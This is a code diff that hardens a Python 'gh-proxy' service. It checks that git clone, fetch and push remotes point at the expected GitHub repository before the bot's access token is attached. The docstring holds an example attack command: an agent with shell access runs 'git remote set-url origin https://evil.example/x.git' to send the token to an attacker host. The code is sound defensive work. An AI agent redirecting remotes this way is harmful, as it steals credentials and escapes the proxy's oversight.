@@ -207,41 +207,68 @@ def _read_origin_url(repo_dir: Path, slot_uid: int | None = None) -> str:
     return proc.stdout.strip()
 
 
-def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str, slot_uid: int | None = None) -> None:
-    """Refuse the push if the worktree's `origin` would leak the PAT.
+def _pat_safe_remote(url: str, expected_repo: str) -> bool:
+    """Whether git may carry the bot PAT to `url` for `expected_repo`.
 
     The PAT is injected via `--config-env http.extraHeader=…` (see
     `git_ops._run_git`); git ONLY forwards that header on HTTP(S) requests.
     So:
-      • If `origin` is HTTPS/HTTP, it MUST resolve to
-        `github.com/<expected_repo>` exactly — anything else and we'd be
+      • An HTTP(S) remote MUST resolve to `github.com/<expected_repo>`
+        exactly, with no embedded credentials — anything else and we'd be
         handing the bot's token to an attacker-controlled host.
       • Other schemes (ssh, file, git://, …) can't carry the PAT header,
-        so we let them through; the legitimate test path uses local file
-        remotes.
-
-    Without this guard, an agent with shell access in the workspace could
-    `git remote set-url origin https://evil.example/x.git` and the proxy
-    would happily push (with the PAT) to that remote.
+        so they're safe by construction; the legitimate test path uses
+        local file remotes.
     """
-    url = _read_origin_url(repo_dir, slot_uid=slot_uid)
     parsed = urlparse(url)
     scheme = (parsed.scheme or "").lower()
     if scheme not in ("http", "https"):
-        return  # PAT header is never sent over non-http(s); safe by construction
+        return True
+    if parsed.username or parsed.password:
+        return False
     host = (parsed.hostname or "").lower()
     # Strip optional leading slash, trailing slash, and `.git` suffix.
     path = parsed.path.strip("/")
     if path.endswith(".git"):
         path = path[:-4]
-    if host != "github.com" or path.lower() != expected_repo.lower():
+    return host == "github.com" and path.lower() == expected_repo.lower()
+
+
+def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str, slot_uid: int | None = None) -> None:
+    """Refuse a token-bearing git op if the repo's `origin` would leak the PAT.
+
+    Without this guard, an agent with shell access in the workspace (or with
+    group write to the shared pool clone) could
+    `git remote set-url origin https://evil.example/x.git` and the proxy
+    would happily fetch/push (with the PAT) to that remote.
+    """
+    url = _read_origin_url(repo_dir, slot_uid=slot_uid)
+    if not _pat_safe_remote(url, expected_repo):
         log.warning(
-            "gh-proxy: refusing push — origin does not match repo",
-            extra={"expected_repo": expected_repo, "origin_host": host},
+            "gh-proxy: refusing git op — origin does not match repo",
+            extra={"expected_repo": expected_repo},
         )
         raise HTTPException(
             400,
-            f"origin url does not match repo {expected_repo!r}; refusing to push",
+            f"origin url does not match repo {expected_repo!r}; refusing token-bearing git op",
+        )
+
+
+def _assert_clone_url_safe(clone_url: str, expected_repo: str) -> None:
+    """Refuse a clone whose caller-supplied `clone_url` would leak the PAT.
+
+    The pool has no `origin` yet, so there is nothing on disk to validate —
+    guard the request body directly with the same policy as
+    `_assert_origin_safe_for_repo`.
+    """
+    if not _pat_safe_remote(clone_url, expected_repo):
+        log.warning(
+            "gh-proxy: refusing clone — clone_url does not match repo",
+            extra={"expected_repo": expected_repo},
+        )
+        raise HTTPException(
+            400,
+            f"clone_url does not match repo {expected_repo!r}; refusing to clone",
         )
 
 
@@ -610,6 +637,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         repo = _require_str(data.get("repo"), "repo")
         clone_url = _require_str(data.get("clone_url"), "clone_url")
         default_branch = _require_str(data.get("default_branch"), "default_branch")
+        _assert_clone_url_safe(clone_url, repo)
         target = _pool_dir(settings, repo)
         try:
             await _run_git_op(
@@ -628,6 +656,9 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         data = await _json_body(request)
         repo = _require_str(data.get("repo"), "repo")
         target = _pool_dir(settings, repo)
+        # Block attacker-controlled `origin` from being a PAT exfil channel
+        # before any subprocess injects the token header.
+        await asyncio.to_thread(_assert_origin_safe_for_repo, target, repo)
         try:
             await _run_git_op(git_fetch_prune, target, token=_resolve_token(settings))
         except GitCommandError as exc:
@@ -640,6 +671,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         repo = _require_str(data.get("repo"), "repo")
         ref = _require_str(data.get("ref"), "ref")
         target = _pool_dir(settings, repo)
+        await asyncio.to_thread(_assert_origin_safe_for_repo, target, repo)
         # fetch_ref is intentionally best-effort; never surfaces a 5xx.
         await _run_git_op(git_fetch_ref, target, ref, token=_resolve_token(settings))
         return JSONResponse({"pool_dir": str(target)})
@@ -650,6 +682,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         repo = _require_str(data.get("repo"), "repo")
         pr_number = _require_int(data.get("pr_number"), "pr_number")
         target = _pool_dir(settings, repo)
+        await asyncio.to_thread(_assert_origin_safe_for_repo, target, repo)
         try:
             await _run_git_op(git_fetch_pr_head, target, pr_number, token=_resolve_token(settings))
         except GitCommandError as exc:
